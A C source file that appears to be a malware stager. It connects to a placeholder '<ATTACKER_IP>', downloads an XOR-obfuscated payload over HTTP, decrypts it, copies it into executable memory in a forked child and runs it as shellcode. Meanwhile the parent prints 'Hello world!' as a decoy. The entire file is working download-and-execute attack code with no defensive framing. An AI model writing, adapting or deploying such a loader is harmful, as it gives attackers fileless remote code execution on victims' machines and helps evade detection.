#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <dlfcn.h>


int main(void) {
    int sock;
    struct sockaddr_in server;
    
    char *request = "GET /<XOR'd PAYLOAD> HTTP/1.0\r\nHost: <ATTACKER_IP>\r\nConnection: close\r\n\r\n";

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 1;
    }

    server.sin_addr.s_addr = inet_addr("<ATTACKER_IP>");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connection failed");
        return 1;
    }

    if (send(sock, request, strlen(request), 0) < 0) {
        perror("Send failed");
        return 1;
    }

    size_t capacity = 4096;
    size_t total_read = 0;
    unsigned char *buffer = malloc(capacity);

    int bytes_received;
    while ((bytes_received = recv(sock, buffer + total_read, capacity - total_read, 0)) > 0) {
        total_read += bytes_received;
        if (total_read == capacity) {
            capacity *= 2;
            buffer = realloc(buffer, capacity);
        }
    }
    close(sock);

    unsigned char *body = NULL;
    size_t body_size = 0;

    for (size_t i = 0; i < total_read - 3; i++) {
        if (buffer[i] == '\r' && buffer[i+1] == '\n' && buffer[i+2] == '\r' && buffer[i+3] == '\n') {
            body = buffer + i + 4; // The payload starts 4 bytes after the first \r
            body_size = total_read - (i + 4);
            break;
        }
    }

    if (body == NULL || body_size == 0) {
        printf("Failed to find payload body.\n");
        free(buffer);
        return 1;
    }

    // printf("Successfully downloaded %zu bytes of payload.\n", body_size);
    char xor_key = 'z';
    for (size_t i = 0; i < body_size; i++) {
        body[i] = body[i] ^ xor_key;
    }
    
    printf("Decryption complete.\n");
    if (fork() == 0)
    {
        void *exec_mem = mmap(NULL, body_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        
        if (exec_mem == MAP_FAILED)
        {
            perror("mmap failed");
            return -1;
        }
        memcpy(exec_mem, body, body_size);
        int (*ret)() = (int (*)())exec_mem;
        ret();
    }
    else
    {
        printf("Hello world!\n");
        return 0;
    }
    free(buffer);
    return 0;
}